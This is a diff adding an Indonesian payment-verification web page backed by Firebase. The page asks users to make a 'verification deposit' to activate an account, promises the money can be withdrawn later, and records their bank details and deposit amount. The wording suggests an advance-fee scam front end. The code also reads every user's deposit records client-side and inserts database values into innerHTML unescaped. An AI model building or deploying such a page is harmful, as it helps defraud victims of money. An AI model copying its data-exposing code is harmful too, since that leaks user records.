@@ -1,0 +1,1291 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Verifikasi Pembayaran</title>
+
+<link rel="stylesheet"
+href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
+<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+<style>
+
+*{
+  margin:0;
+  padding:0;
+  box-sizing:border-box;
+  font-family:'Poppins', sans-serif;
+}
+
+body{
+background:#ffffff;
+padding-top:65px;
+font-family:'Poppins', sans-serif;
+
+}
+
+/* HEADER */
+
+.header{
+position:fixed;
+top:0;
+left:0;
+right:0;
+height:60px;
+background:#fff;
+display:flex;
+align-items:center;
+justify-content:center;
+z-index:999;
+}
+
+.back-btn{
+position:absolute;
+left:15px;
+font-size:18px;
+cursor:pointer;
+color:#222;
+}
+
+.header-title{
+font-size:16px;
+font-weight:600;
+color:#111;
+}
+
+/* FORM */
+
+.container{
+padding:15px;
+}
+
+.form-box{
+background:#fff;
+border-radius:18px;
+padding:18px;
+box-shadow:0 2px 10px rgba(0,0,0,.05);
+}
+
+.label{
+font-size:13px;
+font-weight:600;
+margin-bottom:8px;
+color:#333;
+display:block;
+}
+
+.input{
+width:100%;
+height:48px;
+border:1px solid #ddd;
+border-radius:12px;
+padding:0 14px;
+font-size:14px;
+outline:none;
+margin-bottom:15px;
+background:#e5e5e5;
+}
+
+.input:focus{
+border-color:#3498db;
+}
+
+.textarea{
+width:100%;
+min-height:100px;
+border:1px solid #ddd;
+border-radius:12px;
+padding:12px;
+font-size:14px;
+resize:none;
+outline:none;
+margin-bottom:15px;
+}
+
+.textarea:focus{
+border-color:#3498db;
+}
+
+/* BANK */
+
+.bank-title{
+font-size:13px;
+font-weight:600;
+margin-bottom:10px;
+color:#333;
+}
+
+.bank-list{
+display:flex;
+flex-direction:column;
+gap:10px;
+margin-bottom:20px;
+}
+
+.bank-item{
+display:flex;
+align-items:center;
+gap:12px;
+padding:12px;
+border:1px solid #e5e5e5;
+border-radius:12px;
+cursor:pointer;
+background:#fff;
+transition:.2s;
+}
+
+.bank-item.active{
+border:2px solid #2ecc71;
+background:#f4fff7;
+}
+
+.bank-item img{
+width:34px;
+height:34px;
+object-fit:contain;
+}
+
+.bank-name{
+font-size:14px;
+font-weight:500;
+color:#222;
+}
+
+/* BUTTON */
+
+.pay-btn{
+width:100%;
+height:52px;
+border:none;
+border-radius:14px;
+background:#8100ff;
+color:#fff;
+font-size:15px;
+font-weight:600;
+cursor:pointer;
+}
+
+.pay-btn:active{
+transform:scale(.98);
+}
+
+/* INFO */
+
+.info-box{
+background:#fffbea;
+border:1px solid #ffe58f;
+padding:12px;
+border-radius:12px;
+margin-bottom:18px;
+font-size:13px;
+line-height:1.5;
+color:#8c6d1f;
+}
+
+
+
+
+.bank-maintenance{
+  margin-top:5px;
+  font-size:11px;
+  color:red;
+  font-weight:600;
+}
+
+.bank-item.active{
+  border:2px solid #2ecc71;
+  background:#f5fff7;
+}
+
+
+.bank-dropdown{
+  position:relative;
+  width:100%;
+}
+
+.selected-bank{
+  width:100%;
+  background:#fff;
+  border:1px solid #ddd;
+  border-radius:12px;
+  padding:12px;
+  display:flex;
+  align-items:center;
+  gap:10px;
+  cursor:pointer;
+  margin-bottom: 20px;
+}
+
+.selected-bank img{
+  width:28px;
+  height:28px;
+  object-fit:contain;
+}
+
+.selected-bank span{
+  flex:1;
+  font-size:14px;
+}
+
+.selected-bank i{
+  color:#666;
+}
+
+.dropdown-list{
+  display:none;
+  position:absolute;
+  top:100%;
+  left:0;
+  right:0;
+  background:#fff;
+  border-radius:12px;
+  overflow:hidden;
+  box-shadow:0 5px 20px rgba(0,0,0,.15);
+  z-index:999;
+  margin-top:5px;
+  max-height:300px;
+  overflow-y:auto;
+}
+
+.dropdown-item{
+  padding:12px;
+  display:flex;
+  align-items:center;
+  gap:10px;
+  cursor:pointer;
+  border-bottom:1px solid #f1f1f1;
+}
+
+.dropdown-item:last-child{
+  border-bottom:none;
+}
+
+.dropdown-item:hover{
+  background:#f7f7f7;
+}
+
+.dropdown-item img{
+  width:28px;
+  height:28px;
+  object-fit:contain;
+}
+
+.dropdown-item span{
+  font-size:14px;
+}
+
+.bank-maintenance{
+  margin-left:auto;
+  color:red;
+  font-size:11px;
+  font-weight:600;
+}
+
+.dropdown-item.active{
+  background:#eefaf0;
+}
+
+.selected-bank.active{
+  border-color:#2ecc71;
+  margin-bottom: 20px;
+}
+
+
+
+
+
+
+.profile-box{
+  display:flex;
+  align-items:center;
+  gap:12px;
+  margin-bottom:10px;
+  padding-bottom:10px;
+  border-bottom:1px solid #eee;
+}
+
+.avatar-user{
+  width:50px;
+  height:50px;
+  border-radius:50%;
+  object-fit:cover;
+  border:2px solid #ddd;
+}
+
+.profile-text{
+  font-size:14px;
+}
+
+
+
+.info-top{
+  background:#fff;
+  margin:12px;
+  padding:12px;
+  border-radius:10px;
+  font-size:14px;
+}
+
+.profile-box{
+  margin-bottom:10px;
+  padding-bottom:10px;
+  border-bottom:1px solid #eee;
+}
+
+.deposit-text{
+  margin-top:6px;
+  font-size:13px;
+  color:#333;
+}
+
+
+#infoApp{
+  display:inline-block;
+  padding:2px 6px;
+  border-radius:6px;
+  font-weight:600;
+  font-size:11px;
+  color:#fff;
+  background:#c948f6;
+  line-height:1;
+}
+
+
+
+
+.history-btn{
+  position:absolute;
+  right:15px;
+  top:12px;
+  font-size:18px;
+  cursor:pointer;
+  color:#333;
+}
+
+#v99popupHistory{
+  display:none;
+  position:fixed;
+  top:0;left:0;
+  width:100%;
+  height:100%;
+  background:#fff;
+  z-index:99999;
+  overflow:auto;
+}
+
+
+.bank-text{
+  display:flex;
+  flex-direction:column;
+  gap:2px;
+}
+
+.bank-name{
+  font-weight:600;
+}
+</style>
+</head>
+
+<body>
+
+
+
+    <div id="v99popupHistory">
+
+  <div style="
+  padding:15px;
+  display:flex;
+  align-items:center;
+  justify-content:space-between;
+  font-weight:600;
+  ">
+
+    <span>History Pembayaran</span>
+
+    <button onclick="closeV99History()" style="
+      border:none;
+      background:#eee;
+      padding:6px 10px;
+      border-radius:6px;
+    ">
+      Close
+    </button>
+
+  </div>
+
+  <div id="v99popupHistoryList" style="padding:10px;">
+    Loading...
+  </div>
+
+</div>
+
+
+
+
+<div id="confirmPopup" style="
+display:none;
+position:fixed;
+top:0;left:0;right:0;bottom:0;
+background:rgba(0,0,0,.5);
+justify-content:center;
+align-items:center;
+z-index:9999;
+">
+
+<div style="background:#fff;width:280px;padding:20px;border-radius:12px;text-align:center;">
+
+<img src="ic_launcher_circle.png" style="width:60px;margin-bottom:10px;">
+
+<div style="font-weight:600;margin-bottom:10px;">
+Anda akan melakukan Pembayaran sebesar
+</div>
+
+<div id="confirmAmount" style="font-size:18px;font-weight:700;color:#8e44ad;margin-bottom:10px;">
+Rp 
+</div>
+
+<div style="font-size:13px;margin-bottom:15px;">
+Silakan konfirmasi sekarang
+</div>
+
+<div style="display:flex;gap:10px;">
+
+<button id="cancelBtn" style="flex:1;padding:10px; border-radius: 50px;">Kembali</button>
+
+<button id="okBtn" style="flex:1; border-radius: 50px; padding:10px;background:#8e44ad;color:#fff;border:none;">
+Konfirmasi
+</button>
+
+</div>
+
+</div>
+</div>
+
+
+
+
+
+<!-- HEADER -->
+<div class="header">
+
+  <div class="back-btn" onclick="history.back()">
+    <i class="fa fa-chevron-left"></i>
+  </div>
+
+  <div class="header-title">
+    Verifikasi Pembayaran
+  </div>
+
+  <!-- ICON HISTORY -->
+  <div class="history-btn" onclick="openV99History()">
+    <i class="fa fa-history"></i>
+  </div>
+
+</div>
+
+
+
+
+
+<div class="info-top">
+
+  <div class="profile-box">
+
+    <img id="userFoto" class="avatar-user" src="ic_launcher_circle.png">
+
+    <div class="profile-text">
+      <div><span id="infoNama">-</span></div>
+      <div>By aplikasi: <span id="infoApp">-</span></div>
+    </div>
+
+  </div>
+
+  <div class="deposit-box">
+    <div id="minimalInfo"></div>
+
+    <div class="deposit-text">
+      Nominal deposit verifikasi pada akun anda adalah
+      <b>Rp <span id="depositMinText">0</span></b>
+    </div>
+  </div>
+
+</div>
+
+
+
+<div class="container">
+
+
+<div class="info-box">
+Deposit ini hanya sebagai syarat aktivasi akun. Dana yang Anda depositkan akan masuk ke saldo host Anda dan dapat ditarik kembali ketika akun anda sudah aktif. 
+<a href="#" id="csWa" class="cs-link">Layanan Pelanggan</a>
+
+</div>
+
+<div class="form-box">
+
+
+
+
+  
+
+<div class="bank-title">
+Pilih Bank / E-Wallet
+</div>
+
+<div class="bank-dropdown">
+
+  <div
+  id="selectedBank"
+  class="selected-bank">
+
+    <img
+    id="selectedLogo"
+    src="ICBC_Bank_logo.png"
+    alt="logo">
+
+    <span>
+      Pilih Bank / E-Wallet
+    </span>
+
+    <i class="fa fa-chevron-down"></i>
+
+  </div>
+
+  <div
+  id="bankDropdownList"
+  class="dropdown-list">
+  </div>
+
+</div>
+
+
+
+
+<label class="label">
+Nama Rekening
+</label>
+
+<input
+type="text"
+id="namaRekening"
+class="input"
+placeholder="">
+
+<label class="label">
+Nomor Rekening
+</label>
+
+<input
+type="text"
+id="nomorRekening"
+class="input"
+placeholder="">
+
+<label class="label">
+Jumlah Pembayaran
+</label>
+
+<input
+type="number"
+id="jumlahPembayaran"
+class="input"
+placeholder="">
+
+
+
+
+
+
+
+<label class="label">
+Catatan (Opsional)
+</label>
+
+<textarea
+id="catatan"
+class="textarea"
+placeholder="Tambahkan catatan jika diperlukan..."></textarea>
+
+
+
+<button
+class="pay-btn"
+id="btnBayar">
+
+Bayar Sekarang
+
+</button>
+
+</div>
+
+</div>
+
+
+
+<script type="module">
+
+import { initializeApp }
+from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
+
+import {
+getDatabase,
+ref,
+get,
+push,
+set,
+update
+}
+from "https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js";
+
+/* ================= FIREBASE ================= */
+
+const firebaseConfig = {
+  apiKey: "AIzaSyDkkrmYKIh6hejmTWf3acvLVImIAMOMNKU",
+  authDomain: "users-96dc5.firebaseapp.com",
+  databaseURL: "https://users-96dc5-default-rtdb.asia-southeast1.firebasedatabase.app",
+  projectId: "users-96dc5",
+  storageBucket: "users-96dc5.firebasestorage.app",
+  messagingSenderId: "483322415863",
+  appId: "1:483322415863:web:1397a8f2e808e66ad9e1f2"
+};
+
+const app = initializeApp(firebaseConfig);
+const db = getDatabase(app);
+
+/* ================= LOGIN CHECK ================= */
+
+const login =
+JSON.parse(
+localStorage.getItem("user")
+);
+
+if(!login){
+
+  window.location.replace(
+    "login.html"
+  );
+
+}
+
+
+
+
+function updateLastActive(page = "Verifikasi") {
+
+  const login = JSON.parse(localStorage.getItem("user"));
+  if (!login?.userId) return;
+
+  update(ref(db, "users2/" + login.userId), {
+    lastActive: Date.now(),
+    currentPage: page
+  });
+
+}
+
+["click", "touchstart", "keydown"].forEach(evt => {
+  document.addEventListener(evt, () => {
+    updateLastActive("Verifikasi");
+  }, { passive: true });
+});
+updateLastActive("Verifikasi");
+
+
+
+
+/* ================= USER LOGIN ================= */
+
+let userData = null;
+
+async function loadUser(){
+
+  const snap = await get(
+    ref(
+      db,
+      "users2/" + login.userId
+    )
+  );
+
+  if(!snap.exists()){
+
+    alert("Data user tidak ditemukan");
+
+    return;
+  }
+
+  userData = snap.val();
+
+}
+
+await loadUser();
+
+
+
+
+let minimalDeposit = 0;
+
+async function loadSetting(){
+
+  const snap = await get(
+    ref(db,"SETTING_APP")
+  );
+
+  if(!snap.exists()) return;
+
+  minimalDeposit =
+  Number(
+    snap.val().minimalDeposit || 0
+  );
+
+}
+
+
+
+await loadSetting();
+
+
+
+
+
+document.getElementById("infoNama").innerText =
+  userData.nama || "-";
+
+document.getElementById("infoApp").innerText =
+  userData.appName || "-";
+
+document.getElementById("depositMinText").innerText =
+  minimalDeposit.toLocaleString("id-ID");
+
+// FOTO PROFIL
+document.getElementById("userFoto").src =
+  userData.profil || "default.png";
+
+
+
+let waNumber = "";
+
+async function loadSettingApp(){
+
+  const snap = await get(ref(db, "SETTING_APP"));
+
+  if(!snap.exists()) return;
+
+  const data = snap.val();
+
+  waNumber = data.waLayanan || ""; // dummy fallback
+
+  document.getElementById("csWa").onclick = function(e){
+    e.preventDefault();
+
+    const text =
+      "Halo Layanan kemanusiaan, saya butuh bantuan layanan pelanggan.";
+
+    window.location.href =
+      `https://wa.me/${waNumber}?text=${encodeURIComponent(text)}`;
+  };
+}
+
+await loadSettingApp();
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+document.getElementById(
+  "minimalInfo"
+).innerHTML =
+
+`Minimal Deposit:
+<b>
+Rp ${minimalDeposit.toLocaleString("id-ID")}
+</b>`;
+
+/* ================= PILIH BANK ================= */
+
+
+
+
+let selectedBankLogo = "";
+let selectedBank = "";
+
+const selected =
+document.getElementById(
+  "selectedBank"
+);
+
+const list =
+document.getElementById(
+  "bankDropdownList"
+);
+
+selected.onclick = () => {
+
+  list.style.display =
+  list.style.display === "block"
+  ? "none"
+  : "block";
+
+};
+
+async function loadBankEwallet(){
+
+  const snap = await get(
+    ref(db,"BANK_EWALLET")
+  );
+
+  if(!snap.exists()) return;
+
+  const data = snap.val();
+
+  list.innerHTML = "";
+
+  Object.keys(data).forEach(key => {
+
+    const bank = data[key];
+
+    const item =
+    document.createElement("div");
+
+    item.className =
+    "dropdown-item";
+
+item.innerHTML = `
+  <img
+  src="${bank.logo}"
+  onerror="this.src='bank-default.png'">
+
+  <div class="bank-text">
+    <span class="bank-name">
+      ${bank.namaBank}
+    </span>
+
+    <small class="bank-rekening">
+      ${bank.namaRekening || "-"}
+    </small>
+  </div>
+
+  ${
+    bank.maintenance
+    ?
+    `<div class="bank-maintenance">
+      Maintenance
+    </div>`
+    :
+    ``
+  }
+`;
+
+    // disable jika maintenance
+    if(bank.maintenance){
+
+      item.style.opacity = ".5";
+      item.style.pointerEvents = "none";
+
+    }
+
+ item.onclick = () => {
+
+  document.querySelectorAll(".dropdown-item")
+  .forEach(el => {
+    el.classList.remove("active");
+  });
+
+  item.classList.add("active");
+
+  selectedBank = bank.namaBank;
+
+  selectedBankLogo = bank.logo; // 🔥 INI YANG KAMU LUPA
+
+  document.getElementById("selectedLogo").src = bank.logo;
+
+  selected.querySelector("span").innerText = bank.namaBank;
+
+  selected.classList.add("active");
+
+  list.style.display = "none";
+};
+
+    list.appendChild(item);
+
+  });
+
+}
+
+await loadBankEwallet();
+
+/* ================= FORMAT RUPIAH INPUT ================= */
+
+const jumlahInput =
+document.getElementById(
+"jumlahPembayaran"
+);
+
+jumlahInput.addEventListener(
+"input",
+function(){
+
+  this.value =
+  this.value.replace(
+    /[^0-9]/g,
+    ""
+  );
+
+}
+);
+
+/* ================= GLOBAL ================= */
+
+window.userData = userData;
+window.selectedBankRef = () => selectedBank;
+
+
+
+
+let pendingData = null;
+
+/* ================= CLICK BAYAR ================= */
+document.getElementById("btnBayar")
+.addEventListener("click", async (e) => {
+  e.preventDefault();
+
+  const namaRekening =
+    document.getElementById("namaRekening").value.trim();
+
+  const nomorRekening =
+    document.getElementById("nomorRekening").value.trim();
+
+  const jumlah =
+    Number(document.getElementById("jumlahPembayaran").value || 0);
+
+  const catatan =
+    document.getElementById("catatan").value.trim();
+
+  const bank = selectedBank;
+
+  // ================= VALIDASI =================
+if(!namaRekening){
+  showV99Alert("Nama rekening wajib diisi");
+  return;
+}
+
+if(!nomorRekening){
+  showV99Alert("Nomor rekening wajib diisi");
+  return;
+}
+
+if(!jumlah){
+  showV99Alert("Jumlah pembayaran wajib diisi");
+  return;
+}
+
+if(!bank){
+  showV99Alert("Pilih bank atau e-wallet");
+  return;
+}
+
+if(jumlah < minimalDeposit){
+  showV99Alert(
+    `Minimal deposit Rp ${minimalDeposit.toLocaleString("id-ID")}`
+  );
+  return;
+}
+
+  // ================= SIMPAN DATA SEMENTARA =================
+  pendingData = {
+    namaRekening,
+    nomorRekening,
+    jumlah,
+    catatan,
+    bank
+
+  };
+
+  // ================= SHOW POPUP =================
+  document.getElementById("confirmAmount").innerText =
+    "Rp " + jumlah.toLocaleString("id-ID");
+
+  document.getElementById("confirmPopup").style.display = "flex";
+});
+
+
+/* ================= BUTTON KEMBALI ================= */
+document.getElementById("cancelBtn").onclick = () => {
+  document.getElementById("confirmPopup").style.display = "none";
+};
+
+
+
+
+
+
+/* ================= CONFIRM & SEND FIREBASE ================= */
+document.getElementById("okBtn").onclick = async () => {
+
+  try {
+
+    // ================= AMBIL LIMIT =================
+    const limitSnap = await get(ref(db, "Waktu_pembayaran"));
+
+    let batasDeposit = 2;
+
+    if (limitSnap.exists()) {
+      batasDeposit = Number(limitSnap.val().batasDeposit || 2);
+    }
+
+    // ================= AMBIL USER DATA =================
+    const userRef = ref(db, "users2/" + login.userId);
+    const userSnap = await get(userRef);
+
+    let depositCount = 0;
+
+    if (userSnap.exists()) {
+      depositCount = Number(userSnap.val().depositCount || 0);
+    }
+
+    // ================= CEK LIMIT (INI FIX UTAMA) =================
+if (depositCount >= batasDeposit) {
+
+  showV99Alert(`
+    Batas Verifikasi kamu sudah mencapai maksimum (<b>${batasDeposit}/24</b>).<br><br>
+    Silakan hubungi <b style="color:#007bff; cursor:pointer;"
+    onclick="location.href='Layanan_pelanggan.html'">
+    Layanan Pelanggan</b> untuk bantuan lebih lanjut.
+  `);
+
+  return;
+}
+
+    // ================= TAMBAH COUNTER =================
+    let newCount = depositCount + 1;
+
+    // ================= EXPIRY =================
+    const durasiMenit = limitSnap.exists()
+      ? Number(limitSnap.val().durasiMenit || 30)
+      : 30;
+
+    const expiryTime =
+      Date.now() + (durasiMenit * 60 * 1000);
+
+    // ================= SIMPAN DEPOSIT =================
+    const newRef = push(ref(db,"Deposithost"));
+
+    await set(newRef, {
+      depositId: newRef.key,
+      userId: login.userId,
+      nama: userData.nama || "",
+      email: userData.email || "",
+      wa: userData.wa || "",
+      appName: userData.appName || "",
+
+      namaRekening: pendingData.namaRekening,
+      nomorRekening: pendingData.nomorRekening,
+      jumlah: pendingData.jumlah,
+
+      bankId: selectedBank,
+      bankLogo: selectedBankLogo,
+
+      catatan: pendingData.catatan,
+
+      read: false,
+      status: "pending",
+
+      createdAt: Date.now(),
+      expiryTime: expiryTime
+    });
+
+    // ================= UPDATE USER =================
+    await update(userRef, {
+      activeDepositId: newRef.key,
+      depositCount: newCount
+    });
+
+    document.getElementById("confirmPopup").style.display = "none";
+
+    window.location.href = "Tujuan_pembayaran.html";
+
+  } catch(err) {
+    console.error(err);
+    alert("Gagal menyimpan data: " + err.message);
+  }
+};
+
+
+
+let v99popupOpen = false;
+
+/* OPEN POPUP */
+window.openV99History = function(){
+
+  document.getElementById("v99popupHistory").style.display = "block";
+  v99popupOpen = true;
+
+  loadV99History(); // ambil data firebase
+};
+
+/* CLOSE POPUP */
+window.closeV99History = function(){
+
+  document.getElementById("v99popupHistory").style.display = "none";
+  v99popupOpen = false;
+};
+
+/* BACK BUTTON HP OVERRIDE */
+window.addEventListener("popstate", function(){
+
+  if(v99popupOpen){
+
+    closeV99History();
+
+    // cegah keluar halaman
+    history.pushState(null, null, location.href);
+  }
+
+});
+
+
+
+async function loadV99History(){
+
+  const snap = await get(ref(db,"Deposithost"));
+
+  const box =
+  document.getElementById("v99popupHistoryList");
+
+  box.innerHTML = "";
+
+  if(!snap.exists()){
+    box.innerHTML = "Tidak ada riwayat deposit";
+    return;
+  }
+
+  const items = [];
+
+  snap.forEach(child => {
+
+    const d = child.val();
+
+    if(d.userId !== login.userId){
+      return;
+    }
+
+    items.push(d);
+
+  });
+
+  items.sort((a,b)=>
+    (b.createdAt || 0) -
+    (a.createdAt || 0)
+  );
+
+  items.forEach(d => {
+
+    const div = document.createElement("div");
+
+    div.style = `
+      padding:12px;
+      border-bottom:1px solid #eee;
+      font-size:13px;
+      cursor:pointer;
+    `;
+
+    div.innerHTML = `
+      <b>
+        Rp ${Number(d.jumlah || 0)
+        .toLocaleString("id-ID")}
+      </b><br>
+
+      ${d.bankId || "-"} •
+      ${d.status || "-"}<br>
+
+      ${new Date(
+        d.createdAt
+      ).toLocaleString("id-ID")}
+    `;
+
+    div.onclick = () => {
+
+      location.href =
+      "Tujuan_pembayaran.html?id=" +
+      d.depositId;
+
+    };
+
+    box.appendChild(div);
+
+  });
+
+}
+
+
+
+window.showV99Alert = function(msg){
+  document.getElementById("v99alertText").innerHTML = msg;
+  document.getElementById("v99alertBox").style.display = "flex";
+};
+
+window.closeV99Alert = function(){
+  document.getElementById("v99alertBox").style.display = "none";
+};
+</script>
+
+
+
+
+
+<div id="v99alertBox" style="
+display:none;
+position:fixed;
+top:0;left:0;
+width:100%;
+height:100%;
+background:rgba(0,0,0,.5);
+justify-content:center;
+align-items:center;
+z-index:99999;
+">
+
+<div style="
+background:#fff;
+padding:18px;
+border-radius:12px;
+width:260px;
+text-align:center;
+font-family:Poppins;
+">
+
+<div style="font-size:16px;font-weight:600;margin-bottom:10px;">
+Peringatan
+</div>
+
+<div id="v99alertText" style="font-size:13px;color:#444;margin-bottom:15px;">
+Pesan
+</div>
+
+<button onclick="closeV99Alert()" style="
+padding:8px 15px;
+border:none;
+background:#8e44ad;
+color:#fff;
+border-radius:8px;
+cursor:pointer;
+width:100%;
+">
+OK
+</button>
+
+</div>
+</div>
+
+</body>
+</html>
